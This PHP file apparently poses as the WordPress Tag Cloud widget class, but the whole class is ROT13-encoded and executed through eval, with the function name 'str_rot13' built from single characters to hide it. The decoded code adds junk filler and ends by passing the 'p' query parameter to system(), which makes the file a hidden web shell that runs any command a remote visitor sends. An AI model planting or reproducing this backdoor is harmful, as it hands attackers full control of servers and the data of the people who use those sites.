<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Gnt_Pybhq pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n Gnt pybhq jvqtrg.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Gnt_Pybhq rkgraqf JC_Jvqtrg {

	/**
	 * Frgf hc n arj Gnt Pybhq jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'qrfpevcgvba'                 => __( 'N pybhq bs lbhe zbfg hfrq gntf.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		cnerag::__pbafgehpg( 'gnt_pybhq', __( 'Gnt Pybhq' ), $jvqtrg_bcf );
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Gnt Pybhq jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Gnt Pybhq jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		$pheerag_gnkbabzl = $guvf->_trg_pheerag_gnkbabzl( $vafgnapr );

		vs ( ! rzcgl( $vafgnapr['gvgyr'] ) ) {
			$gvgyr = $vafgnapr['gvgyr'];
		} ryfr {
			vs ( 'cbfg_gnt' === $pheerag_gnkbabzl ) {
				$gvgyr = __( 'Gntf' );
			} ryfr {
				$gnk   = trg_gnkbabzl( $pheerag_gnkbabzl );
				$gvgyr = $gnk->ynoryf->anzr;
			}
		}

		$qrsnhyg_gvgyr = $gvgyr;

		$fubj_pbhag = ! rzcgl( $vafgnapr['pbhag'] );

		$gnt_pybhq = jc_gnt_pybhq(
			/**
			 * Svygref gur gnkbabzl hfrq va gur Gnt Pybhq jvqtrg.
			 *
			 * @fvapr 2.8.0
			 * @fvapr 3.0.0 Nqqrq gnkbabzl qebc-qbja.
			 * @fvapr 4.9.0 Nqqrq gur `$vafgnapr` cnenzrgre.
			 *
			 * @frr jc_gnt_pybhq()
			 *
			 * @cnenz neenl $netf     Netf hfrq sbe gur gnt pybhq jvqtrg.
			 * @cnenz neenl $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
			 */
			nccyl_svygref(
				'jvqtrg_gnt_pybhq_netf',
				neenl(
					'gnkbabzl'   => $pheerag_gnkbabzl,
					'rpub'       => snyfr,
					'fubj_pbhag' => $fubj_pbhag,
				),
				$vafgnapr
			)
		);

		vs ( rzcgl( $gnt_pybhq ) ) {
			erghea;
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		rpub $netf['orsber_jvqtrg'];
		vs ( $gvgyr ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}

		$sbezng = pheerag_gurzr_fhccbegf( 'ugzy5', 'anivtngvba-jvqtrgf' ) ? 'ugzy5' : 'kugzy';

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-ani-zrah-jvqtrg.cuc */
		$sbezng = nccyl_svygref( 'anivtngvba_jvqtrgf_sbezng', $sbezng );

		vs ( 'ugzy5' === $sbezng ) {
			// Gur gvgyr znl or svygrerq: Fgevc bhg UGZY naq znxr fher gur nevn-ynory vf arire rzcgl.
			$gvgyr      = gevz( fgevc_gntf( $gvgyr ) );
			$nevn_ynory = $gvgyr ? $gvgyr : $qrsnhyg_gvgyr;
			rpub '<ani nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\">';
		}

		rpub '<qvi pynff=\"gntpybhq\">';

		rpub $gnt_pybhq;

		rpub \"</qvi>\a\";

		vs ( 'ugzy5' === $sbezng ) {
			rpub '</ani>';
		}

		rpub $netf['nsgre_jvqtrg'];
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Gnt Pybhq jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Frggvatf gb fnir be obby snyfr gb pnapry fnivat.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr             = neenl();
		$vafgnapr['gvgyr']    = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );
		$vafgnapr['pbhag']    = ! rzcgl( $arj_vafgnapr['pbhag'] ) ? 1 : 0;
		$vafgnapr['gnkbabzl'] = fgevcfynfurf( $arj_vafgnapr['gnkbabzl'] );
		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur Gnt Pybhq jvqtrg frggvatf sbez.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		$gvgyr = ! rzcgl( $vafgnapr['gvgyr'] ) ? $vafgnapr['gvgyr'] : '';
		$pbhag = vffrg( $vafgnapr['pbhag'] ) ? (obby) $vafgnapr['pbhag'] : snyfr;
		?>
		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\"><?cuc _r( 'Gvgyr:' ); ?></ynory>
			<vachg glcr=\"grkg\" pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" inyhr=\"<?cuc rpub rfp_ngge( $gvgyr ); ?>\" />
		</c>
		<?cuc
		$gnkbabzvrf       = trg_gnkbabzvrf( neenl( 'fubj_gntpybhq' => gehr ), 'bowrpg' );
		$pheerag_gnkbabzl = $guvf->_trg_pheerag_gnkbabzl( $vafgnapr );

		fjvgpu ( pbhag( $gnkbabzvrf ) ) {

			// Ab gnt pybhq fhccbegvat gnkbabzvrf sbhaq, qvfcynl reebe zrffntr.
			pnfr 0:
				?>
				<vachg glcr=\"uvqqra\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gnkbabzl' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gnkbabzl' ); ?>\" inyhr=\"\" />
				<c>
					<?cuc _r( 'Gur gnt pybhq jvyy abg or qvfcynlrq fvapr gurer ner ab gnkbabzvrf gung fhccbeg gur gnt pybhq jvqtrg.' ); ?>
				</c>
				<?cuc
				oernx;

			// Whfg n fvatyr gnt pybhq fhccbegvat gnkbabzl sbhaq, ab arrq gb qvfcynl n fryrpg.
			pnfr 1:
				$xrlf     = neenl_xrlf( $gnkbabzvrf );
				$gnkbabzl = erfrg( $xrlf );
				?>
				<vachg glcr=\"uvqqra\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gnkbabzl' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gnkbabzl' ); ?>\" inyhr=\"<?cuc rpub rfp_ngge( $gnkbabzl ); ?>\" />
				<?cuc
				oernx;

			// Zber guna bar gnt pybhq fhccbegvat gnkbabzl sbhaq, qvfcynl n fryrpg.
			qrsnhyg:
				?>
				<c>
					<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'gnkbabzl' ); ?>\"><?cuc _r( 'Gnkbabzl:' ); ?></ynory>
					<fryrpg pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gnkbabzl' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gnkbabzl' ); ?>\">
					<?cuc sbernpu ( $gnkbabzvrf nf $gnkbabzl => $gnk ) : ?>
						<bcgvba inyhr=\"<?cuc rpub rfp_ngge( $gnkbabzl ); ?>\" <?cuc fryrpgrq( $gnkbabzl, $pheerag_gnkbabzl ); ?>>
							<?cuc rpub rfp_ugzy( $gnk->ynoryf->anzr ); ?>
						</bcgvba>
					<?cuc raqsbernpu; ?>
					</fryrpg>
				</c>
				<?cuc
		}

		vs ( pbhag( $gnkbabzvrf ) > 0 ) {
			?>
			<c>
				<vachg glcr=\"purpxobk\" pynff=\"purpxobk\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'pbhag' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'pbhag' ); ?>\" <?cuc purpxrq( $pbhag, gehr ); ?> />
				<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'pbhag' ); ?>\"><?cuc _r( 'Fubj gnt pbhagf' ); ?></ynory>
			</c>
			<?cuc
		}
	}

	/**
	 * Ergevrirf gur gnkbabzl sbe gur pheerag Gnt pybhq jvqtrg vafgnapr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 * @erghea fgevat Anzr bs gur pheerag gnkbabzl vs frg, bgurejvfr 'cbfg_gnt'.
	 */
	choyvp shapgvba _trg_pheerag_gnkbabzl( $vafgnapr ) {
		vs ( ! rzcgl( $vafgnapr['gnkbabzl'] ) && gnkbabzl_rkvfgf( $vafgnapr['gnkbabzl'] ) ) {
			erghea $vafgnapr['gnkbabzl'];
		}

		erghea 'cbfg_gnt';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>